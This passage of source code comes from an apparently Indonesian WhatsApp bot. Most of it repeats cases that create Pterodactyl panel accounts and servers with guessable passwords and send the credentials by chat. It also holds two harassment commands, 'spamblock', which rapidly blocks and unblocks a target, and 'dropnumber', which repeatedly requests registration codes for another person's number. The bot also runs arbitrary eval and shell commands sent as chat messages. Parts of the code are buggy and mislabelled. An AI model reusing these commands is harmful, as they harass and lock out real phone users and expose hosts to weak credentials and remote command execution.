            "name": name+' - 8gb',
            "description": 'Create with '+namabot,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 5
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    })
    let res = await f3.json()
    if (res.errors) return xgreply(JSON.stringify(res.errors[0], null, 2))
    let server = res.attributes
    let p = await xgreply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '4gb': {
    if(!isReseller){
        xgreply(mess.seller)
    }
    inireact()
  if (!isDeveloper) return xgreply(mess.owner)
    let t = text.split(',');
    if (t.length < 2) return xgreply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username
    let egg = global.eggsnya
    let loc = global.location
    let memo = "4024"
    let cpu = "110"
    let disk = "4024"
    let email = username + "zxv@sweetrabit.ml"
    akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
    if (!u) return
    let d = (await ryozingod.onWhatsApp(u.split`@`[0]))[0] || {}
    let password = username+'001'
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    })
    let data = await f.json();
    if (data.errors) return xgreply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    })
    xgreply(`User ID: ${user.id}`)
    let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ryozingod.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
    let data2 = await f2.json()
    let startup_cmd = data2.attributes.startup
    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name+' - 8gb',
            "description": 'Create with '+namabot,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 5
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    })
    let res = await f3.json()
    if (res.errors) return xgreply(JSON.stringify(res.errors[0], null, 2))
    let server = res.attributes
    let p = await xgreply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '5gb': {
    if(!isReseller){
        xgreply(mess.seller)
    }
    inireact()
  if (!isDeveloper) return xgreply(mess.owner)
    let t = text.split(',');
    if (t.length < 2) return xgreply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username
    let egg = global.eggsnya
    let loc = global.location
    let memo = "5024"
    let cpu = "130"
    let disk = "5024"
    let email = username + "zxv@sweetrabit.ml"
    akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
    if (!u) return
    let d = (await ryozingod.onWhatsApp(u.split`@`[0]))[0] || {}
    let password = username+'001'
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    })
    let data = await f.json();
    if (data.errors) return xgreply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    })
    xgreply(`User ID: ${user.id}`)
    let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ryozingod.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
    let data2 = await f2.json()
    let startup_cmd = data2.attributes.startup
    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name+' - 5gb',
            "description": 'Create with '+namabot,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 5
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    })
    let res = await f3.json()
    if (res.errors) return xgreply(JSON.stringify(res.errors[0], null, 2))
    let server = res.attributes
    let p = await xgreply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '6gb': {
    inireact()
  if (!isDeveloper) return xgreply(mess.owner)
    let t = text.split(',');
    if (t.length < 2) return xgreply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username
    let egg = global.eggsnya
    let loc = global.location
    let memo = "6024"
    let cpu = "150"
    let disk = "6024"
    let email = username + "zxv@sweetrabit.ml"
    akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
    if (!u) return
    let d = (await ryozingod.onWhatsApp(u.split`@`[0]))[0] || {}
    let password = username+'001'
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    })
    let data = await f.json();
    if (data.errors) return xgreply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    })
    xgreply(`User ID: ${user.id}`)
    let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ryozingod.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
    let data2 = await f2.json()
    let startup_cmd = data2.attributes.startup
    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name+' - 5gb',
            "description": 'Create with '+namabot,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 5
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    })
    let res = await f3.json()
    if (res.errors) return xgreply(JSON.stringify(res.errors[0], null, 2))
    let server = res.attributes
    let p = await xgreply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '7gb': {
    inireact()
  if (!isDeveloper) return xgreply(mess.owner)
    let t = text.split(',');
    if (t.length < 2) return xgreply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username
    let egg = global.eggsnya
    let loc = global.location
    let memo = "7024"
    let cpu = "170"
    let disk = "7024"
    let email = username + "zxv@sweetrabit.ml"
    akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
    if (!u) return
    let d = (await ryozingod.onWhatsApp(u.split`@`[0]))[0] || {}
    let password = username+'001'
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    })
    let data = await f.json();
    if (data.errors) return xgreply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    })
    xgreply(`User ID: ${user.id}`)
    let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ryozingod.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
    let data2 = await f2.json()
    let startup_cmd = data2.attributes.startup
    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name+' - 7gb',
            "description": 'Create with '+namabot,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 5
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    })
    let res = await f3.json()
    if (res.errors) return xgreply(JSON.stringify(res.errors[0], null, 2))
    let server = res.attributes
    let p = await xgreply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case 'unli': {
    inireact()
  if (!isDeveloper) return xgreply(mess.owner)
    let t = text.split(',');
    if (t.length < 2) return xgreply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username
    let egg = global.eggsnya
    let loc = global.location
    let memo = "0"
    let cpu = "0"
    let disk = "0"
    let email = username + "zxv@sweetrabit.ml"
    akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
    if (!u) return
    let d = (await ryozingod.onWhatsApp(u.split`@`[0]))[0] || {}
    let password = username+'001'
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    })
    let data = await f.json();
    if (data.errors) return xgreply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    })
    xgreply(`User ID: ${user.id}`)
    let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ryozingod.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
    let data2 = await f2.json()
    let startup_cmd = data2.attributes.startup
    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name+' - Unlimited',
            "description": 'Create with '+namabot,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 5
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    })
    let res = await f3.json()
    if (res.errors) return xgreply(JSON.stringify(res.errors[0], null, 2))
    let server = res.attributes
    let p = await xgreply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case 'spamblock': {
if (!isPremium) return xgreply(mess.premium)
inireact()
bnnd = text.split(",")[0]+'@s.whatsapp.net'
for (let i = 0; i < 30; i++) {
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await ryozingod.updateBlockStatus(bnnd, 'block')
await ryozingod.updateBlockStatus(bnnd, 'unblock')
await sleep(1000)
}
}
break

case 'dropnumber': {
m.reply(mess.wait)
  const countrycode = q.split(",")[0];
  const number = q.split(",")[1];
  const phonenumberz = `${countrycode}${number}`;

  const dropNumber = async () => {
    try {
      await ryozingod.requestRegistrationCode({
        phoneNumber: '+' + phonenumberz,
        phoneNumberCountryCode: countrycode,
        phoneNumberNationalNumber: number,
        phoneNumberMobileCountryCode: 724,
      });
    } catch (error) {
      if (error.reason === 'temporarily_unavailable') {
        m.reply(`Invalid number: +${phonenumber}`);
        setTimeout(dropNumber, 25000);
        return;
      }
      console.error(error);
    }
  };
  dropNumber();
}
break

default:
if (budy.startsWith('=>')) {
if (!isDeveloper) return evalreply(mess.owner)

function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return evalreply(bang)
}
try {
evalreply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
evalreply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isDeveloper) return evalreply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await evalreply(evaled)
} catch (err) {
await evalreply(String(err))
}
}
if (budy.startsWith('$')) {
if (!isDeveloper) return evalreply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if (err) return evalreply(err)
if (stdout) return evalreply(stdout)
})
}
}
} catch (err) {
m.reply(util.format(err))
console.log(util.format(err))
}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
